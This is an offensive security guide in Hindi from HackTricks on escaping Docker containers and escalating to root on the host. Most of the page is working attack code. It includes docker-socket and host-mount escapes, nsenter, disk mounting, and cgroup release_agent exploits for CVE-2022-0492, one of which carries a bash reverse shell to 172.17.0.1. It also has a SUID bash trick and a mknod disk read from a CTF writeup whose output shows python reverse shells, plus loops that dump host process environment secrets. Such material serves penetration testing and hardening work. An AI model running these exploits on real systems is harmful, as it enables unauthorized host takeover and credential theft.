# Docker Breakout / Privilege Escalation

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके दुनिया के **सबसे उन्नत** समुदाय टूल्स द्वारा संचालित **वर्कफ्लोज़ को आसानी से बनाएं और ऑटोमेट करें**।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## स्वचालित एन्युमेरेशन और एस्केप

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): यह भी **कंटेनर्स का एन्युमेरेशन कर सकता है**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): यह टूल कंटेनर का एन्युमेरेशन करने और स्वचालित रूप से एस्केप करने की कोशिश करने के लिए काफी **उपयोगी है**
* [**amicontained**](https://github.com/genuinetools/amicontained): कंटेनर के पास कौन से अधिकार हैं यह जानने के लिए उपयोगी टूल, ताकि इससे बाहर निकलने के तरीके खोजे जा सकें
* [**deepce**](https://github.com/stealthcopter/deepce): कंटेनर्स का एन्युमेरेशन करने और उनसे एस्केप करने के लिए टूल
* [**grype**](https://github.com/anchore/grype): इमेज में स्थापित सॉफ्टवेयर में मौजूद CVEs प्राप्त करें

## माउंटेड Docker Socket Escape

यदि आप पाते हैं कि **docker socket माउंटेड है** डॉकर कंटेनर के अंदर, तो आप इससे बाहर निकल पाएंगे।\
यह आमतौर पर उन डॉकर कंटेनर्स में होता है जिन्हें किसी कारण से डॉकर डेमॉन से जुड़ने की आवश्यकता होती है ताकि क्रियाएं की जा सकें।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप डॉकर डेमन से संवाद करने के लिए सामान्य डॉकर कमांड्स का उपयोग कर सकते हैं:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
यदि **docker socket अप्रत्याशित स्थान पर है**, तो आप इससे संवाद कर सकते हैं **`docker`** कमांड का उपयोग करके और पैरामीटर **`-H unix:///path/to/docker.sock`** के साथ।
{% endhint %}

Docker daemon [पोर्ट पर भी सुन सकता है (डिफ़ॉल्ट रूप से 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) या Systemd-आधारित सिस्टमों पर, Docker daemon के साथ संवाद Systemd socket `fd://` के माध्यम से हो सकता है।

{% hint style="info" %}
इसके अलावा, अन्य उच्च-स्तरीय runtimes के runtime sockets पर ध्यान दें:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Abuse Escape

आपको कंटेनर की capabilities की जांच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई भी है, तो आप इससे बच सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

आप **पहले उल्लिखित स्वचालित उपकरणों** का उपयोग करके या: के माध्यम से वर्तमान कंटेनर capabilities की जांच कर सकते हैं।
```bash
capsh --print
```
निम्नलिखित पृष्ठ पर आप **लिनक्स क्षमताओं के बारे में और जान सकते हैं** और कैसे उनका दुरुपयोग करके अधिकारों को बढ़ाने/बचने के लिए:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## विशेषाधिकार प्राप्त कंटेनरों से बचना

एक विशेषाधिकार प्राप्त कंटेनर को `--privileged` फ्लैग के साथ या विशिष्ट रक्षाओं को अक्षम करके बनाया जा सकता है:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label=disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev माउंट करें`

`--privileged` फ्लैग का उपयोग करने से महत्वपूर्ण सुरक्षा चिंताएं पैदा होती हैं, और इसका शोषण इसे सक्षम करके एक डॉकर कंटेनर लॉन्च करने पर निर्भर करता है। इस फ्लैग का उपयोग करते समय, कंटेनरों को सभी उपकरणों तक पूर्ण पहुंच होती है और seccomp, AppArmor, और लिनक्स क्षमताओं से प्रतिबंधों की कमी होती है। आप इस पृष्ठ पर `--privileged` के सभी प्रभावों को **पढ़ सकते हैं**:

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### विशेषाधिकार प्राप्त + hostPID

इन अनुमतियों के साथ आप सिर्फ **होस्ट में रूट के रूप में चल रही प्रक्रिया के नामस्थान में जा सकते हैं** जैसे कि init (pid:1) बस चलाकर: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

इसे कंटेनर में निष्पादित करके परीक्षण करें:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### विशेषाधिकार प्राप्त

केवल विशेषाधिकार प्राप्त फ्लैग के साथ आप **होस्ट की डिस्क तक पहुँचने** का प्रयास कर सकते हैं या **release\_agent या अन्य एस्केप्स का दुरुपयोग करके बच निकलने** का प्रयास कर सकते हैं।

निम्नलिखित बायपास का परीक्षण करें एक कंटेनर में निम्न को निष्पादित करके:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### माउंटिंग डिस्क - Poc1

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर **fdisk -l** जैसे कमांड की अनुमति नहीं देंगे। हालांकि, गलत कॉन्फ़िगर किए गए डॉकर कमांड में जहां `--privileged` या `--device=/dev/sda1` फ्लैग कैप्स के साथ निर्दिष्ट है, होस्ट ड्राइव को देखने के लिए विशेषाधिकार प्राप्त करना संभव है।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

तो होस्ट मशीन पर कब्जा करने के लिए, यह सरल है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
और वोइला! आप अब होस्ट की फाइल सिस्टम तक पहुँच सकते हैं क्योंकि यह `/mnt/hola` फोल्डर में माउंट किया गया है।

#### डिस्क माउंटिंग - Poc2

कंटेनर के अंदर, एक हमलावर क्लस्टर द्वारा बनाई गई लिखने योग्य hostPath वॉल्यूम के माध्यम से मूल होस्ट OS तक आगे की पहुँच प्राप्त करने का प्रयास कर सकता है। नीचे कुछ सामान्य चीजें हैं जिन्हें आप कंटेनर के अंदर जांच सकते हैं ताकि आप इस हमलावर वेक्टर का लाभ उठा सकें:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### प्रिविलेज्ड एस्केप का दुरुपयोग मौजूदा release\_agent का ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="प्रारंभिक PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### विशेषाधिकार प्राप्त एस्केप का दुरुपयोग बनाए गए release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

तकनीक की **व्याख्या** यहाँ पाएं:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### विशेषाधिकार प्राप्त एस्केप रिलीज़_एजेंट का दुरुपयोग करते हुए बिना सापेक्ष पथ को जाने - PoC3

पिछले एक्सप्लॉइट्स में **होस्ट फाइल सिस्टम के अंदर कंटेनर का संपूर्ण पथ प्रकट हो जाता है**। हालांकि, यह हमेशा मामला नहीं होता है। जब आप **होस्ट के अंदर कंटेनर का संपूर्ण पथ नहीं जानते हैं** तब आप इस तकनीक का उपयोग कर सकते हैं:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
निम्नलिखित PoC को एक privileged container के भीतर निष्पादित करने पर आपको इसी प्रकार का आउटपुट मिलना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### संवेदनशील माउंट्स का दुरुपयोग करके विशेषाधिकार एस्केप

कई फाइलें हो सकती हैं जो माउंट की गई हों और जो **मूल होस्ट के बारे में जानकारी दें**। इनमें से कुछ यह भी संकेत कर सकती हैं कि **होस्ट द्वारा कुछ निष्पादित किया जाए जब कुछ होता है** (जो कि एक हमलावर को कंटेनर से बाहर निकलने की अनुमति दे सकता है)।\
इन फाइलों के दुरुपयोग से निम्नलिखित हो सकता है:

* release\_agent (पहले ही कवर किया गया)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

हालांकि, आप इस पृष्ठ पर **अन्य संवेदनशील फाइलों** की जांच कर सकते हैं:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### मनमाने माउंट्स

कई बार आप पाएंगे कि **कंटेनर में होस्ट से कुछ वॉल्यूम माउंट किया गया है**। यदि इस वॉल्यूम को सही ढंग से कॉन्फ़िगर नहीं किया गया है, तो आप **संवेदनशील डेटा तक पहुंच/संशोधित कर सकते हैं**: सीक्रेट्स पढ़ें, ssh authorized\_keys बदलें…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 शेल्स और होस्ट माउंट के साथ प्रिविलेज एस्कलेशन

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है जिसमें होस्ट का कोई फोल्डर माउंटेड है और आपने **होस्ट पर एक गैर-विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में एस्केप किया है** और माउंटेड फोल्डर पर पढ़ने की पहुंच है।\
आप **कंटेनर** के अंदर **माउंटेड फोल्डर** में एक **bash suid फाइल** बना सकते हैं और उसे **होस्ट से निष्पादित करके** प्रिविलेज एस्कलेशन कर सकते हैं।
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 शेल्स के साथ प्रिविलेज एस्कलेशन

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है और आपने **होस्ट पर एक गैर-विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में बच निकले हैं**, तो आप दोनों शेल्स का दुरुपयोग करके **होस्ट के अंदर प्रिविलेज एस्कलेशन** कर सकते हैं यदि आपके पास कंटेनर के अंदर MKNOD क्षमता है (यह डिफ़ॉल्ट रूप से है) जैसा कि [**इस पोस्ट में समझाया गया है**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
इस क्षमता के साथ कंटेनर के अंदर का रूट उपयोगकर्ता **ब्लॉक डिवाइस फाइलें बनाने** की अनुमति रखता है। डिवाइस फाइलें विशेष फाइलें होती हैं जिनका उपयोग **अंतर्निहित हार्डवेयर और कर्नेल मॉड्यूल्स तक पहुंचने** के लिए किया जाता है। उदाहरण के लिए, /dev/sda ब्लॉक डिवाइस फाइल **सिस्टम डिस्क पर कच्चे डेटा को पढ़ने** की पहुंच प्रदान करती है।

Docker यह सुनिश्चित करता है कि ब्लॉक डिवाइसेस **कंटेनर के भीतर से दुरुपयोग नहीं किए जा सकते** इसके लिए कंटेनर पर एक cgroup नीति सेट करके जो ब्लॉक डिवाइसेस के पढ़ने और लिखने को रोकती है।\
हालांकि, यदि एक ब्लॉक डिवाइस **कंटेनर के अंदर बनाई गई है तो इसे पहुंचा जा सकता है** /proc/PID/root/ फोल्डर के माध्यम से किसी के द्वारा **कंटेनर के बाहर**, सीमा यह है कि **प्रक्रिया का स्वामित्व वही उपयोगकर्ता** के पास होना चाहिए बाहर और अंदर दोनों जगह कंटेनर में।

**शोषण** का उदाहरण इस [**राइटअप**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) से:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

यदि आप होस्ट की प्रक्रियाओं तक पहुँच सकते हैं, तो आप उन प्रक्रियाओं में संग्रहीत बहुत सारी संवेदनशील जानकारी तक पहुँच सकेंगे। टेस्ट लैब चलाएँ:
```
docker run --rm -it --pid=host ubuntu bash
```
उदाहरण के लिए, आप `ps auxn` जैसे कमांड का उपयोग करके प्रक्रियाओं की सूची बना सकते हैं और कमांड्स में संवेदनशील विवरणों की खोज कर सकते हैं।

फिर, चूंकि आप **/proc/ में होस्ट की प्रत्येक प्रक्रिया तक पहुँच सकते हैं, आप उनके env secrets चुरा सकते हैं** निम्नलिखित चलाकर:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
आप **अन्य प्रक्रियाओं के फाइल डिस्क्रिप्टर्स तक पहुँच सकते हैं और उनकी खुली हुई फाइलों को पढ़ सकते हैं**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
आप **प्रक्रियाओं को मारकर DoS का कारण भी बना सकते हैं**।

{% hint style="warning" %}
यदि आपके पास किसी तरह से कंटेनर के बाहर की प्रक्रिया पर विशेषाधिकार **प्रवेश है**, तो आप `nsenter --target <pid> --all` या `nsenter --target <pid> --mount --net --pid --cgroup` जैसे कमांड चला सकते हैं ताकि **उसी ns प्रतिबंधों के साथ एक शेल चलाएं** (आशा है कि कोई नहीं) **जैसा कि उस प्रक्रिया का है।**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
यदि एक कंटेनर को Docker [होस्ट नेटवर्किंग ड्राइवर (`--network=host`)](https://docs.docker.com/network/host/) के साथ कॉन्फ़िगर किया गया था, तो उस कंटेनर का नेटवर्क स्टैक Docker होस्ट से अलग नहीं होता है (कंटेनर होस्ट के नेटवर्किंग नेमस्पेस को शेयर करता है), और कंटेनर को अपना आईपी-एड्रेस आवंटित नहीं किया जाता है। दूसरे शब्दों में, **कंटेनर सभी सेवाओं को सीधे होस्ट के आईपी पर बाइंड करता है**। इसके अलावा कंटेनर **सभी नेटवर्क ट्रैफ़िक को इंटरसेप्ट कर सकता है जो होस्ट** शेयर्ड इंटरफ़ेस `tcpdump -i eth0` पर भेज और प्राप्त कर रहा है।

उदाहरण के लिए, आप इसका उपयोग होस्ट और मेटाडेटा इंस्टेंस के बीच **ट्रैफ़िक को स्निफ़ और यहां तक कि स्पूफ करने** के लिए कर सकते हैं।

निम्नलिखित उदाहरणों की तरह:

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

आप इसके अलावा होस्ट के अंदर **localhost पर बाइंड की गई नेटवर्क सेवाओं** तक पहुंच सकेंगे या यहां तक कि **नोड के मेटाडेटा अनुमतियों** तक पहुंच सकेंगे (जो कि एक कंटेनर द्वारा पहुंची जा सकने वाली अनुमतियों से अलग हो सकती हैं)।

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
यदि आपके पास केवल `hostIPC=true` है, तो आप शायद ज्यादा कुछ नहीं कर सकते। यदि होस्ट पर कोई प्रक्रिया या किसी अन्य पॉड की कोई प्रक्रियाएं होस्ट के **अंतर-प्रक्रिया संचार तंत्र** (साझा मेमोरी, सेमाफोर ऐरे, मैसेज क्यू, आदि) का उपयोग कर रही हैं, तो आप उन्हीं तंत्रों को पढ़/लिख सकते हैं। पहली जगह जहाँ आप देखना चाहेंगे वह `/dev/shm` है, क्योंकि यह `hostIPC=true` वाले किसी भी पॉड और होस्ट के बीच साझा की जाती है। आपको `ipcs` के साथ अन्य IPC तंत्रों की भी जांच करनी चाहिए।

* **/dev/shm की जांच करें** - इस साझा मेमोरी स्थान में किसी भी फाइल की तलाश करें: `ls -la /dev/shm`
* **मौजूदा IPC सुविधाओं की जांच करें** - आप यह देख सकते हैं कि क्या कोई IPC सुविधाएँ उपयोग में हैं `/usr/bin/ipcs` के साथ। इसे जांचें: `ipcs -a`

### क्षमताओं की पुनर्प्राप्ति

यदि सिस्टम कॉल **`unshare`** पर प्रतिबंध नहीं है तो आप सभी क्षमताओं को निम्नलिखित चलाकर पुनर्प्राप्त कर सकते हैं:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### यूजर नेमस्पेस का दुरुपयोग सिमलिंक के माध्यम से

इस पोस्ट में बताई गई दूसरी तकनीक [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) यह दर्शाती है कि आप यूजर नेमस्पेस के साथ बाइंड माउंट्स का दुरुपयोग कैसे कर सकते हैं, ताकि होस्ट के अंदर की फाइलों को प्रभावित किया जा सके (उस विशेष मामले में, फाइलों को हटाना).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें ताकि आप आसानी से **वर्कफ्लोज़ को बना सकें** और **स्वचालित कर सकें** जो दुनिया के **सबसे उन्नत** समुदाय टूल्स द्वारा संचालित होते हैं।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc एक्सप्लॉइट (CVE-2019-5736)

यदि आप `docker exec` को रूट के रूप में निष्पादित कर सकते हैं (शायद sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करके कंटेनर से बाहर निकलने के लिए विशेषाधिकार बढ़ाने का प्रयास कर सकते हैं (एक्सप्लॉइट [यहाँ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). यह तकनीक मूल रूप से **होस्ट** के _**/bin/sh**_ बाइनरी को **कंटेनर से** **ओवरराइट** करेगी, इसलिए कोई भी जो docker exec निष्पादित करता है वह पेलोड को ट्रिगर कर सकता है।

पेलोड को उचित रूप से बदलें और `go build main.go` के साथ main.go को बिल्ड करें। परिणामी बाइनरी को डॉकर कंटेनर में निष्पादन के लिए रखा जाना चाहिए।\
निष्पादन पर, जैसे ही यह `[+] Overwritten /bin/sh successfully` दिखाता है, आपको होस्ट मशीन से निम्नलिखित निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

यह मुख्य.go फाइल में मौजूद पेलोड को ट्रिगर करेगा।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
कंटेनर अन्य CVEs के लिए भी संवेदनशील हो सकता है, आप एक सूची [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) में पा सकते हैं।
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

* **नेमस्पेस:** प्रक्रिया को नेमस्पेस के माध्यम से अन्य प्रक्रियाओं से **पूरी तरह से अलग** होना चाहिए, इसलिए हम नेमस्पेस के कारण अन्य प्रोक्स के साथ बातचीत नहीं कर सकते (डिफ़ॉल्ट रूप से IPCs, यूनिक्स सॉकेट्स, नेटवर्क सेवाओं, D-Bus, `/proc` अन्य प्रोक्स के साथ संवाद नहीं कर सकते).
* **रूट यूजर**: डिफ़ॉल्ट रूप से प्रक्रिया चलाने वाला यूजर रूट यूजर होता है (हालांकि इसकी विशेषाधिकार सीमित होते हैं).
